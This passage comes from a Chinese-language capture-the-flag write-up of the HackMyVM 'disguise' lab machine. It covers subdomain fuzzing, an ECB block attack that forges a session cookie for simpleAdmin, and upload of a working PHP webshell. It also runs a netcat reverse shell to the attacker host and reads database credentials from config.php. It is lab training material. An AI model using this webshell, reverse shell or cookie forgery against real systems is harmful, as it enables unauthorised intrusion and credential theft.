
 :: Method           : GET
 :: URL              : http://disguise.hmv/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.disguise.hmv
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 11916
________________________________________________

www                     [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 404ms]
[WARN] Caught keyboard interrupt (Ctrl-C)
</code></pre>
<p><code class="notranslate">ffuf</code>发现了一个子域名 <code class="notranslate">www.disguise.hmv</code>。将其添加到 <code class="notranslate">/etc/hosts</code> 文件。</p>
<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ sudo nano /etc/hosts

┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters

192.168.205.211 www.disguise.hmv disguise.hmv
</code></pre>
<p>使用<code class="notranslate">curl</code>检查 <code class="notranslate">www.disguise.hmv</code>。</p>
<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ curl -I http://www.disguise.hmv
HTTP/1.1 301 Moved Permanently
Date: Fri, 16 May 2025 02:53:06 GMT
Server: Apache/2.4.59 (Debian)
X-Redirect-By: WordPress
Location: http://disguise.hmv/
Content-Type: text/html; charset=UTF-8
</code></pre>
<p>该子域名通过301重定向到主站 <code class="notranslate">http://disguise.hmv/</code>，没有提供新的攻击面。</p>
<h2>4.2 Gobuster DNS模式子域名爆破</h2>
<p>考虑到<code class="notranslate">ffuf</code>扫描速度也较慢，尝试使用<code class="notranslate">gobuster</code>的DNS模式进行子域名爆破，首先使用大字典。</p>
<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ gobuster dns -d disguise.hmv -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 64
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Domain:     disguise.hmv
[+] Threads:    64
[+] Timeout:    1s
[+] Wordlist:   /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
===============================================================
Starting gobuster in DNS enumeration mode
===============================================================
Found: www.disguise.hmv

Progress: 3541 / 114442 (3.09%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 3553 / 114442 (3.10%)
===============================================================
Finished
===============================================================
</code></pre>
<p><code class="notranslate">gobuster</code>使用大字典时也仅发现了 <code class="notranslate">www.disguise.hmv</code>。更换为较小的字典再次尝试。</p>
<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ gobuster dns -d disguise.hmv -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 64
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Domain:     disguise.hmv
[+] Threads:    64
[+] Timeout:    1s
[+] Wordlist:   /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
===============================================================
Starting gobuster in DNS enumeration mode
===============================================================
Found: www.disguise.hmv

Progress: 4989 / 4990 (99.98%)
===============================================================
Finished
===============================================================
</code></pre>
<p>小字典扫描完毕，仍然只有 <code class="notranslate">www.disguise.hmv</code>。没办法了，也没其他的路了，硬扫吧。再次使用大字典进行扫描。</p>
<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ gobuster dns -d disguise.hmv -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 64
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Domain:     disguise.hmv
[+] Threads:    64
[+] Timeout:    1s
[+] Wordlist:   /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
===============================================================
Starting gobuster in DNS enumeration mode
===============================================================
Found: www.disguise.hmv

Progress: 25708 / 114442 (22.46%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 25739 / 114442 (22.49%)
===============================================================
Finished
===============================================================
</code></pre>
<p>蛙趣，不对啊，2w多都没出来这么夸张？看看其他人的wp。操.......好像是软件问题。</p>
<h2>4.3 Wfuzz子域名爆破 (转机)</h2>
<p>更换为<code class="notranslate">wfuzz</code>工具，同样通过修改Host头的方式进行子域名爆破。</p>
<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ wfuzz -c -u "http://disguise.hmv/" -H "HOST:FUZZ.disguise.hmv" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --hw 4602
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://disguise.hmv/
Total requests: 114441

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000001:   301        0 L      0 W        0 Ch        "www - www"
000005051:   200        18 L     52 W       846 Ch      "dark - dark"
^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...

Total time: 236.0730
Processed Requests: 8494
Filtered Requests: 8492
Requests/sec.: 35.98038
</code></pre>
<p><code class="notranslate">wfuzz</code>成功爆破出新的子域名 <code class="notranslate">dark.disguise.hmv</code>！</p>
<p>沉默是今晚的康桥。</p>
<p>将新发现的子域名 <code class="notranslate">dark.disguise.hmv</code> 添加到 <code class="notranslate">/etc/hosts</code> 文件。</p>
<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ sudo nano /etc/hosts
[sudo] password for kali:

┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters

192.168.205.211 www.disguise.hmv disguise.hmv dark.disguise.hmv
</code></pre>
<p>访问 <code class="notranslate">http://dark.disguise.hmv</code>。<br>
<a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/39f834ae7b9137007ad1f41c719bbd6d0b4f636ffbb57b985d07af734f16918c/68747470733a2f2f377231554d50482e746f702f696d6167652f32303235303531363131303833393439372e77656270"><img src="https://camo.githubusercontent.com/39f834ae7b9137007ad1f41c719bbd6d0b4f636ffbb57b985d07af734f16918c/68747470733a2f2f377231554d50482e746f702f696d6167652f32303235303531363131303833393439372e77656270" alt="image-20250516110839064" data-canonical-src="https://7r1UMPH.top/image/20250516110839497.webp" style="max-width: 100%;"></a><br>
页面显示为一个名为“暗黑商店”的站点，风格有点炫。</p>
<h1>五、暗黑商店 (dark.disguise.hmv) 渗透测试</h1>
<h2>5.1 初步探索与注册功能分析</h2>
<p>查看新站点的页面源码，未发现明显可利用信息。尝试使用之前在WordPress站点发现的用户名 <code class="notranslate">simpleAdmin</code> 进行弱密码登录，失败。<br>
观察注册页面 (register.php)，发现其表单提交时存在前端JavaScript校验函数 <code class="notranslate">validateForm</code>，该函数限制用户名长度不能超过8个字符。</p>
<pre lang="javascript" class="notranslate"><code class="notranslate">// validateForm (部分示例)
function validateForm() {
    var username = document.forms["register"]["username"].value;
    if(username.length &gt; 8) {
        alert("用户名不能超过8个字符");
        return false;
    }
    return true;
}
</code></pre>
<p>由于目标用户 <code class="notranslate">simpleAdmin</code> (11字符) 长度超过8位，该前端校验会阻止注册。可以通过浏览器开发者工具删除或修改此JS函数来绕过前端校验。</p>
<p>首先注册一个普通用户 <code class="notranslate">admin</code>，密码 <code class="notranslate">111111</code>，以熟悉系统功能。<br>
登录后进入个人中心页面 (profile.php)。</p>
<pre lang="html" class="notranslate"><code class="notranslate">&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;个人中心 - 暗黑商店&lt;/title&gt;
    &lt;link rel="stylesheet" href="style3.css"&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;header&gt;
        &lt;h1&gt;暗黑商店&lt;/h1&gt;
        &lt;nav&gt;
            &lt;span&gt;欢迎, admin
            &lt;/span&gt; |
            &lt;a href="index.php"&gt;首页&lt;/a&gt; |
                        &lt;a href="logout.php"&gt;退出&lt;/a&gt;
        &lt;/nav&gt;
    &lt;/header&gt;

    &lt;div class="profile"&gt;
        &lt;h2&gt;个人中心&lt;/h2&gt;
        &lt;p&gt;欢迎访问您的个人主页，这里可以查看和管理您的账户信息&lt;/p&gt;

            &lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>页面源码依然简洁。使用BurpSuite抓取HTTP请求，发现登录后的Cookie中包含一个名为 <code class="notranslate">dark_session</code> 的字段，其值经过了URL编码，末尾的 <code class="notranslate">%3D%3D</code> 暗示其可能是Base64编码。</p>
<pre lang="http" class="notranslate"><code class="notranslate">GET /profile.php HTTP/1.1
Host: dark.disguise.hmv
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Referer: http://dark.disguise.hmv/login.php
Connection: keep-alive
Cookie: PHPSESSID=g31oqe3lpvnk3gd1obs5pmm4a0; dark_session=1mr9fHMuTh6J56IrZHP28w%3D%3D
Upgrade-Insecure-Requests: 1
Priority: u=0, i
</code></pre>
<p>这 <code class="notranslate">dark_session</code> 看起来有点机会，但目前尚不清楚其具体作用。</p>
<h2>5.2 SQL注入与XSS尝试</h2>
<p>在进一步分析 <code class="notranslate">dark_session</code> 前，先尝试常规的Web漏洞测试。<br>
使用<code class="notranslate">sqlmap</code>对登录表单 (login.php) 进行SQL注入检测。</p>
<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ sqlmap -u "http://dark.disguise.hmv/login.php" --forms --batch --level=3 --risk=3
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.9.4#stable}
|_ -| . ["]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 23:42:55 /2025-05-15/

[23:42:55] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=e2744i2rksa...aqbikf4hhl'). Do you want to use those [Y/n] Y
[23:42:55] [INFO] searching for forms
[1/1] Form:
POST http://dark.disguise.hmv/login.php
POST data: username=&amp;password=
do you want to test this form? [Y/n/q]
&gt; Y
Edit POST data [default: username=&amp;password=] (Warning: blank fields detected): username=&amp;password=
do you want to fill blank fields with random values? [Y/n] Y
# ... (大量sqlmap探测过程输出) ...
[23:43:21] [ERROR] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent', skipping to the next target
[23:43:21] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/kali/.local/share/sqlmap/output/results-05152025_1142pm.csv'

[*] ending @ 23:43:21 /2025-05-15/
</code></pre>
<p>Sqlmap未发现SQL注入漏洞。<br>
尝试在注册用户名的位置输入XSS payload <code class="notranslate">&lt;script&gt;alert(document.domain)&lt;/script&gt;</code>，密码 <code class="notranslate">111111</code>。登录后发现特殊字符 <code class="notranslate">&lt;</code> 和 <code class="notranslate">&gt;</code> 被HTML实体编码，XSS尝试失败。</p>
<h2>5.3 Cookie (<code class="notranslate">dark_session</code>) 分析与伪造 (ECB Oracle Padding Attack)</h2>
<p>重点分析 <code class="notranslate">dark_session</code> Cookie。<br>
以用户 <code class="notranslate">admin</code> (密码 <code class="notranslate">111111</code>) 登录后获取的 <code class="notranslate">dark_session</code> 为 <code class="notranslate">1mr9fHMuTh6J56IrZHP28w%3D%3D</code>。<br>
使用CyberChef进行URL解码，得到 <code class="notranslate">1mr9fHMuTh6J56IrZHP28w==</code>。<br>
<a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/5c91037936e1a4ec9241d4ff5b06daf805895a629319e5230b8e6f362e460ab5/68747470733a2f2f377231554d50482e746f702f696d6167652f32303235303531363132333635323133372e77656270"><img src="https://camo.githubusercontent.com/5c91037936e1a4ec9241d4ff5b06daf805895a629319e5230b8e6f362e460ab5/68747470733a2f2f377231554d50482e746f702f696d6167652f32303235303531363132333635323133372e77656270" alt="image-20250516123651762" data-canonical-src="https://7r1UMPH.top/image/20250516123652137.webp" style="max-width: 100%;"></a><br>
再进行Base64解码。<br>
<a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/29e26c5e4d88d9e8bebc50e181e2fddae23c1beaf1582fc50fd54fa33a8e73c8/68747470733a2f2f377231554d50482e746f702f696d6167652f32303235303531363132333735343138332e77656270"><img src="https://camo.githubusercontent.com/29e26c5e4d88d9e8bebc50e181e2fddae23c1beaf1582fc50fd54fa33a8e73c8/68747470733a2f2f377231554d50482e746f702f696d6167652f32303235303531363132333735343138332e77656270" alt="image-20250516123753831" data-canonical-src="https://7r1UMPH.top/image/20250516123754183.webp" style="max-width: 100%;"></a><br>
得到一串二进制乱码。通过命令行工具验证：</p>
<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ echo "1mr9fHMuTh6J56IrZHP28w==" | base64 -d
�j�|s.N��+ds��
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ echo "1mr9fHMuTh6J56IrZHP28w==" | base64 -d | xxd
00000000: d66a fd7c 732e 4e1e 89e7 a22b 6473 f6f3  .j.|s.N....+ds..
</code></pre>
<p>这16字节的乱码很可能是加密后的用户信息。</p>
<h3>5.3.1 分析加密模式和块大小</h3>
<p>为了分析加密细节，注册不同长度的用户名（密码固定为<code class="notranslate">111111</code>），观察 <code class="notranslate">dark_session</code> 的变化。</p>
<ul>
<li>用户 <code class="notranslate">admin</code> (5字节): <code class="notranslate">dark_session=1mr9fHMuTh6J56IrZHP28w%3D%3D</code>
<ul>
<li>Base64解码后xxd: <code class="notranslate">d66a fd7c 732e 4e1e 89e7 a22b 6473 f6f3</code> (16字节)</li>
</ul>
</li>
<li>用户 <code class="notranslate">adminadmin</code> (10字节): <code class="notranslate">dark_session=nkhz%2FGuSp8O6W0%2FNKRWDrg%3D%3D</code>
<ul>
<li>Base64解码后xxd: <code class="notranslate">9e48 73fc 6b92 a7c3 ba5b 4fcd 2915 83ae</code> (16字节)</li>
</ul>
</li>
<li>用户 <code class="notranslate">adminadminadmin</code> (15字节): <code class="notranslate">dark_session=iVItH823tj24X11GL%2BrzqF15zKXhTZzq4geu6%2BoJYh0%3D</code>
<ul>
<li>Base64解码后xxd: <code class="notranslate">8952 2d1f cdb7 b63d b85f 5d46 2fea f3a8 5d79 cca5 e14d 9cea e207 aeeb ea09 621d</code> (32字节)</li>
</ul>
</li>
<li>用户 <code class="notranslate">adminadminadminadmin</code> (20字节): <code class="notranslate">dark_session=iVItH823tj24X11GL%2BrzqHXcmFsh%2Be0Wk1hiTcLtOls%3D</code>
<ul>
<li>Base64解码后xxd: <code class="notranslate">8952 2d1f cdb7 b63d b85f 5d46 2fea f3a8 75dc 985b 21f9 ed16 9358 624d c2ed 3a5b</code> (32字节)</li>
</ul>
</li>
</ul>
<p>观察15字节和20字节用户名的密文，它们的前16字节完全相同 (<code class="notranslate">8952...f3a8</code>)。这强烈暗示了加密模式为 <strong>ECB (Electronic Codebook)</strong>，且块大小为 <strong>16字节</strong>。</p>
<h3>5.3.2 确认密码不参与Cookie加密</h3>
<p>注册用户 <code class="notranslate">test2</code> (5字节)，密码 <code class="notranslate">1111111111</code> (与之前的 <code class="notranslate">111111</code> 不同)。<br>
<code class="notranslate">dark_session=oLEv4TbjA09b0PNNSNRdhA%3D%3D</code><br>
Base64解码后xxd: <code class="notranslate">a0b1 2fe1 36e3 034f 5bd0 f34d 48d4 5d84</code> (仍为16字节)。<br>
密文长度和结构未因密码改变而改变，确认密码不直接参与 <code class="notranslate">dark_session</code> 的加密。</p>
<h3>5.3.3 推断Salt和填充机制</h3>
<p>加密的明文结构推测为 <code class="notranslate">Salt + Username</code>，然后进行PKCS#7填充。</p>
<ul>
<li><code class="notranslate">adminadmin</code> (10字节) + Salt -&gt; 16字节密文 (1块)</li>
<li><code class="notranslate">adminadminadmin</code> (15字节) + Salt -&gt; 32字节密文 (2块)</li>
</ul>
<p>这表明 <code class="notranslate">(Salt长度 + 10)</code> 经过填充后为16字节，而 <code class="notranslate">(Salt长度 + 15)</code> 经过填充后为32字节。<br>
设Salt长度为 <code class="notranslate">S</code>。</p>
<ul>
<li><code class="notranslate">S + 10 &lt;= 16</code></li>
<li><code class="notranslate">S + 15 &gt; 16</code> (因为产生了第二块密文)</li>
</ul>
<p>如果 <code class="notranslate">S = 4</code>：</p>
<ul>
<li><code class="notranslate">4 + 10 = 14</code>字节。PKCS#7填充2字节 (每个字节为<code class="notranslate">\x02</code>)，总共16字节。</li>
<li><code class="notranslate">4 + 15 = 19</code>字节。PKCS#7填充13字节 (每个字节为<code class="notranslate">\x0d</code>)，总共32字节。<br>
这个推断与第一个密文块可能相同的ECB特性吻合。</li>
</ul>
<p>进一步验证Salt长度和PKCS#7填充规则（特别是当数据长度正好是块大小时）：<br>
注册用户 <code class="notranslate">adminadminad</code> (12字节)，密码 <code class="notranslate">111111</code>。<br>
<code class="notranslate">dark_session=iVItH823tj24X11GL%2BrzqMJwkfrsOdSxW16pbszGJLY%3D</code><br>
Base64解码后xxd: <code class="notranslate">8952 2d1f cdb7 b63d b85f 5d46 2fea f3a8 c270 91fa ec39 d4b1 5b5e a96e ccc6 24b6</code> (32字节)。<br>
如果Salt为4字节，则 <code class="notranslate">Salt(4) + adminadminad(12) = 16</code>字节。根据PKCS#7填充规则，当数据长度等于块大小时，仍需填充一个完整的16字节块 (16个<code class="notranslate">\x10</code>)。因此总明文长度为32字节，产生32字节密文。这与观察一致，确认 <strong>Salt长度为4字节</strong>。</p>
<h3>5.3.4 伪造simpleAdmin的Cookie</h3>
<p>目标用户 <code class="notranslate">simpleAdmin</code> (11字节)。<br>
服务器实际加密的明文为 <code class="notranslate">Salt(4) + "simpleAdmin"(11) = 15</code>字节。<br>
PKCS#7填充后为 <code class="notranslate">Salt(4) + "simpleAdmin"(11) + "\x01"(padding)</code>，共16字节。</p>
<p>为了获取密文，我们可以注册一个用户名为 <code class="notranslate">simpleAdmin\x01</code> (这里 <code class="notranslate">\x01</code> 是用户名的一部分，总长12字节)。<br>
服务器加密的明文块1将是 <code class="notranslate">Salt(4) + "simpleAdmin\x01"(username_part, 12) = 16</code>字节。<br>
由于正好16字节，会再填充一个16字节的 <code class="notranslate">\x10</code> 块。<br>
但重要的是，第一个16字节明文块的数据与我们目标用户 <code class="notranslate">simpleAdmin</code> 经过填充后的明文块数据是相同的！</p>
<p>操作步骤：</p>
<ol>
<li>
<p>在注册页面输入用户名 <code class="notranslate">simpleAdmin</code>。</p>
</li>
<li>
<p>使用BurpSuite拦截注册请求，将<code class="notranslate">username</code>参数值修改为 <code class="notranslate">simpleAdmin%01</code> (URL编码的<code class="notranslate">\x01</code>)，密码 <code class="notranslate">111111</code>。</p>
<p><em>注意：登录的时候也要进行和2一样的操作</em></p>
</li>
<li>
<p>注册成功后，浏览器Cookie中的 <code class="notranslate">dark_session</code> 值为 <code class="notranslate">%2B1%2B3%2FNxCLcIR0Jq9qDudF8JwkfrsOdSxW16pbszGJLY%3D</code>。</p>
</li>
<li>
<p>URL解码：<code class="notranslate">+1+3/NxCLcIR0Jq9qDudF8JwkfrsOdSxW16pbszGJLY=</code></p>
</li>
<li>
<p>Base64解码后进行xxd查看：</p>
<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ echo "+1+3/NxCLcIR0Jq9qDudF8JwkfrsOdSxW16pbszGJLY=" | base64 -d | xxd
00000000: fb5f b7fc dc42 2dc2 11d0 9abd a83b 9d17  ._...B-......;..
00000010: c270 91fa ec39 d4b1 5b5e a96e ccc6 24b6  .p...9..[^.n..$.
</code></pre>
</li>
<li>
<p>取第一个16字节的密文 <code class="notranslate">fb5f b7fc dc42 2dc2 11d0 9abd a83b 9d17</code>。</p>
</li>
<li>
<p>将此16字节密文进行Base64编码：</p>
<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ echo "+1+3/NxCLcIR0Jq9qDudF8JwkfrsOdSxW16pbszGJLY=" | base64 -d | head -c 16 | base64
+1+3/NxCLcIR0Jq9qDudFw==
</code></pre>
</li>
<li>
<p>将得到的Base64编码后的字符串 <code class="notranslate">%2B1%2B3%2FNxCLcIR0Jq9qDudFw%3D%3D</code> (注意URL编码) 设置为 <code class="notranslate">dark_session</code> Cookie的值。</p>
</li>
<li>
<p>访问 <code class="notranslate">http://dark.disguise.hmv/profile.php</code>，成功以 <code class="notranslate">simpleAdmin</code> 用户身份登录。<br>
<a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/e0eba43758dc6a83c0006c6fe7c55b14af40acb70ed4a15c585c8c20802e2bad/68747470733a2f2f377231554d50482e746f702f696d6167652f32303235303531363136333734393031322e77656270"><img src="https://camo.githubusercontent.com/e0eba43758dc6a83c0006c6fe7c55b14af40acb70ed4a15c585c8c20802e2bad/68747470733a2f2f377231554d50482e746f702f696d6167652f32303235303531363136333734393031322e77656270" alt="image-20250516163748655" data-canonical-src="https://7r1UMPH.top/image/20250516163749012.webp" style="max-width: 100%;"></a><br>
这波操作，来之不易啊！</p>
</li>
</ol>
<h1>六、获取WebShell</h1>
<p>以<code class="notranslate">simpleAdmin</code>身份登录后，进入后台管理页面 (<code class="notranslate">/manager/index.php</code>)，发现有添加商品的功能，并且可以上传商品图片。先上传了一个<code class="notranslate">reverse.php</code><br>
<a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/059e021553d5c468b80d7c726d7f6697ac7de896e160916e6917e1b05d1d0029/68747470733a2f2f377231554d50482e746f702f696d6167652f32303235303531363136343135353539362e77656270"><img src="https://camo.githubusercontent.com/059e021553d5c468b80d7c726d7f6697ac7de896e160916e6917e1b05d1d0029/68747470733a2f2f377231554d50482e746f702f696d6167652f32303235303531363136343135353539362e77656270" alt="image-20250516164155309" data-canonical-src="https://7r1UMPH.top/image/20250516164155596.webp" style="max-width: 100%;"></a></p>
<p>到首页查看源码，进入图片网址发现这个方式进入的不解析php</p>
<p>使用<code class="notranslate">gobuster</code>对 <code class="notranslate">dark.disguise.hmv</code> 站点进行目录扫描，确认图片上传路径。</p>
<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ gobuster dir -u http://dark.disguise.hmv -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,md,html,zip
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://dark.disguise.hmv
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,md,html,zip,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 282]
/.php                 (Status: 403) [Size: 282]
/images               (Status: 301) [Size: 323] [--&gt; http://dark.disguise.hmv/images/]
/index.php            (Status: 200) [Size: 1020]
/login.php            (Status: 200) [Size: 1134]
# ... (部分输出) ...
/captcha.php          (Status: 200) [Size: 370]
^C
[!] Keyboard interrupt detected, terminating.
Progress: 20066 / 1323360 (1.52%)
===============================================================
Finished
===============================================================
</code></pre>
<p>发现 <code class="notranslate">/images/</code> 目录。但是是301状态，尝试在<code class="notranslate">/images/</code>访问<code class="notranslate">reverse.php</code>显示404,服务器对文件名做了处理（MD5或者其他哈希）<br>
重新上传一个简单的PHP一句话木马，内容为：</p>
<pre lang="php" class="notranslate"><code class="notranslate">&lt;?php
if (isset($_REQUEST['cmd'])) {
    $command = $_REQUEST['cmd'];
    echo "&lt;pre&gt;"; // For better formatting of command output

    // Execute the command
    // Using passthru for direct output, or system/exec if preferred
    passthru($command, $return_var);
    // Alternatively:
    // $output = shell_exec($command);
    // echo htmlentities($output);

    echo "&lt;/pre&gt;";
} else {
    echo "&lt;html&gt;&lt;head&gt;&lt;title&gt;PHP CMD Exec&lt;/title&gt;&lt;/head&gt;&lt;body&gt;";
    echo "&lt;form method='GET'&gt;";
    echo "Enter command: &lt;input type='text' name='cmd' autofocus&gt;";
    echo "&lt;input type='submit' value='Execute'&gt;";
    echo "&lt;/form&gt;";
    echo "&lt;p&gt;Example: ?cmd=ls -la OR ?cmd=whoami&lt;/p&gt;";
    echo "&lt;/body&gt;&lt;/html&gt;";
}
?&gt;
</code></pre>
<p>上传时，给文件名加了一个<code class="notranslate">'</code>成功报错拿到了真实文件名。<br>
<a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/f325eab5ec6febddd62ebffc362a67e8b028f8a02ecac30a0aa726c783cdd216/68747470733a2f2f377231554d50482e746f702f696d6167652f32303235303531363136353031303235352e77656270"><img src="https://camo.githubusercontent.com/f325eab5ec6febddd62ebffc362a67e8b028f8a02ecac30a0aa726c783cdd216/68747470733a2f2f377231554d50482e746f702f696d6167652f32303235303531363136353031303235352e77656270" alt="image-20250516165009887" data-canonical-src="https://7r1UMPH.top/image/20250516165010255.webp" style="max-width: 100%;"></a><br>
访问 <code class="notranslate">http://dark.disguise.hmv/images/8d755f95e5203d7d71d93aefa9649514.php?cmd=id</code>。</p>
<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ curl http://dark.disguise.hmv/images/8d755f95e5203d7d71d93aefa9649514.php?cmd=id
&lt;pre&gt;uid=33(www-data) gid=33(www-data) groups=33(www-data)
&lt;/pre&gt;
</code></pre>
<p>命令成功执行，当前用户为 <code class="notranslate">www-data</code>。</p>
<h1>七、权限提升</h1>
<h2>7.1 获取反弹Shell</h2>
<p>利用已上传的Webshell获取一个反弹Shell，以便进行更方便的操作。<br>
在Kali上设置监听：</p>
<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/shell]
└─$ nc -lvnp 8888
listening on [any] 8888 ...
</code></pre>
<p>通过Webshell执行反弹命令：<br>
<code class="notranslate">http://dark.disguise.hmv/images/8d755f95e5203d7d71d93aefa9649514.php?cmd=nc+192.168.205.206+8888+-e+/bin/bash</code></p>
<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/c013b7f1516cd81ad2c4642e71b4a61b7890c4c5c90a60857eef3cde8dff8a76/68747470733a2f2f377231554d50482e746f702f696d6167652f32303235303531363136353133363930372e77656270"><img src="https://camo.githubusercontent.com/c013b7f1516cd81ad2c4642e71b4a61b7890c4c5c90a60857eef3cde8dff8a76/68747470733a2f2f377231554d50482e746f702f696d6167652f32303235303531363136353133363930372e77656270" alt="image-20250516165136706" data-canonical-src="https://7r1UMPH.top/image/20250516165136907.webp" style="max-width: 100%;"></a></p>
<p>成功接收到反弹Shell。</p>
<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/shell]
└─$ nc -lvnp 8888
listening on [any] 8888 ...
connect to [192.168.205.206] from (UNKNOWN) [192.168.205.211] 51496
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
</code></pre>
<p>对Shell进行TTY优化：</p>
<pre lang="bash" class="notranslate"><code class="notranslate">script /dev/null -c bash
# 按 Ctrl+Z 将其置于后台
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash
stty rows 24 columns 80
</code></pre>
<h2>7.2 信息收集 (www-data 用户)</h2>
<p>在 <code class="notranslate">/var/www/dark/</code> 目录下找到 <code class="notranslate">config.php</code>。</p>
<pre lang="bash" class="notranslate"><code class="notranslate">www-data@disguise:/var/www/dark$ cat config.php
&lt;?php

$DB_USER = 'dark_db_admin';
$DB_PASS = 'Str0ngPassw0d1***';
$DB_NAME = 'dark_shop';

?&gt;
</code></pre>
<p>拿到数据库用户名 <code class="notranslate">dark_db_admin</code> 和密码 <code class="notranslate">Str0ngPassw0d1***</code>。<br>
登录数据库查看用户信息。</p>
<pre lang="bash" class="notranslate"><code class="notranslate">www-data@disguise:/var/www/dark$ mysql -u dark_db_admin -p
Enter password:
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 78045
Server version: 10.3.39-MariaDB-0+deb10u2 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

